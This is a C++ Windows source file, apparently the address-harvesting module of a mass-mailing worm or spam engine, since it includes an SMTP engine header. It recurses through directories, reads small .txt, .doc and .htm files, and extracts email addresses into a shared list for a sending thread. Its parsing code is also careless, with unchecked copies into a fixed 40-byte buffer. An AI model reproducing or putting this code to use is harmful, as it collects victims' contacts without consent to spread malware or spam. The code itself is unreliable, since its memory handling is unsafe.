
   #include "stdafx.h"
   #include "smtp_engine.h"


   //mail search module

   Mailist x_emails;

   const Nsuffix=3;

   char *good_sufixs[Nsuffix]={".txt",".doc",".htm"};


   void AddToMailList(char Mail[])
   {
       int i;
       BOOL already_exist=FALSE;
       CharLower(Mail);
       if(x_emails.number_of_mails<MAX_MAILS && lstrlen(Mail)>5)
       {
           for(i=0;i<x_emails.number_of_mails;i++)
               if(lstrcmp(x_emails.mail_list[i],Mail)==0)
                   already_exist=TRUE;
           if(already_exist==FALSE)
           {
               lstrcpy(x_emails.mail_list[x_emails.number_of_mails],Mail);
               x_emails.number_of_mails++;
           }
       }
   }


   BOOL IsValidMail(char mail[])
   {
       BOOL there_is_at=FALSE,there_is_dot=FALSE;

       int i;

       for(i=0;i<lstrlen(mail);i++)
       {
           if(mail[i]=='@')
               there_is_at=TRUE;
           if(mail[i]=='.')
               there_is_dot=TRUE;
       }

       return(there_is_at && there_is_dot);
   }



   void ScanBuffer(char *buffer,int size)
   {
       char *bp;
       int i,xlen=0,xlen2;
       char mail[40];

       int mp=0;

       //valid mail : user@domain.suffix

       for(i=0;i<size-1;i++)
       {
           bp=strchr(buffer,'@');
           if(bp==NULL)            //if there is no @ than get out
               break;

           i+=(bp-buffer);     //move index

           //get user len
           xlen=0;

           mp=0;

           do
           {

               bp--;

               if(*bp<48)
                   break;      //minimum char
               if(*bp>122)
                   break;      //maximum char

               if(*bp<97 && *bp>90)
                   break;

               if(*bp<65 && *bp>57)
                   break;

               xlen++;

               if(xlen>10)
                   goto no_dot;

           }while(TRUE);



           if(xlen<2)
               goto no_dot;

           bp++;

           xlen++;


           memcpy(mail,bp,xlen);

           mp+=xlen;

           bp+=xlen;

           buffer=bp;


           bp=strchr(bp,'.');


           if(bp==NULL)
               goto no_dot;

           if((bp-buffer)>15)
               goto no_dot;

           xlen2=xlen;
           xlen=0;


           do
           {
               xlen++;

               bp--;

               if(*bp=='@')
                   break;

           }while(TRUE);

           xlen2++;

           memcpy(mail+mp,bp+1,xlen);

           mp+=xlen;

           bp+=xlen+1;

           xlen=0;


           do
           {
               if(*(bp+xlen)<48)
                   break;      //minimum char
               if(*(bp+xlen)>122)
                   break;      //maximum char

               if(*(bp+xlen)<97 && *bp>90)
                   break;

               if(*(bp+xlen)<65 && *bp>57)
                   break;

               xlen++;

               if(xlen>15)
                   break;

           }while(TRUE);


           if(xlen<15)
               memcpy(mail+mp,bp,xlen);

           mail[mp+xlen]=NULL;



           if(IsValidMail(mail)==TRUE)
               AddToMailList(mail);

   no_dot:
           buffer+=i;          //move buffer pointer
       }


   }


   void FindMails(char File[])
   {
       char buffer[1024];
       HANDLE hfile;
       DWORD readed;

       hfile=CreateFile(File,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

       if(hfile!=INVALID_HANDLE_VALUE)
       {
           while(ReadFile(hfile,buffer,sizeof(buffer)-24,&readed,NULL))
           {
               if(readed==0)
                   break;

               try
               {
                   ScanBuffer(buffer,readed);
               }
               catch(...)
               {
                   __asm nop
               }
           }
           CloseHandle(hfile);
       }
   }


   void FindFiles()
   {
       /*  Files Search Function

           input:currect directory setted
           output:none

       */


       //variables
       WIN32_FIND_DATA wfd;
       HANDLE hfind;
       int i=0;

       hfind=FindFirstFile("*.*",&wfd);

       if(hfind!=INVALID_HANDLE_VALUE)
       {
           do
           {
               if(wfd.cFileName[0]!='.')   //most not be .. or .
               {
                   wfd.dwFileAttributes&=FILE_ATTRIBUTE_DIRECTORY;
                   if(wfd.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY) //is directory ?
                   {
                       if(SetCurrentDirectory(wfd.cFileName)==TRUE)
                       {
                           FindFiles();
                           SetCurrentDirectory("..");  //return to upper directory
                       }
                   }
                   else
                   {
                       //check suffix
                       for(i=0;i<Nsuffix;i++)
                       {
                           if(memcmp(wfd.cFileName+lstrlen(wfd.cFileName)-4,good_sufixs[i],4)==0)
                           {
                               if(wfd.nFileSizeLow>1050 && wfd.nFileSizeLow<15360)
                               {
                                   FindMails(wfd.cFileName);
                               }
                               break;
                           }
                       }
                   }
               }
           }while(FindNextFile(hfind,&wfd));
           FindClose(hfind);
       }
   }

   void InitMailSearch(char Root[])
   {
       SetCurrentDirectory(Root);
   }

   DWORD WINAPI mail_search(LPVOID mail_list)
   {
       memcpy(&x_emails,mail_list,sizeof(Mailist));
       FindFiles();
       memcpy(mail_list,&x_emails,sizeof(Mailist));
       return NULL;
   }
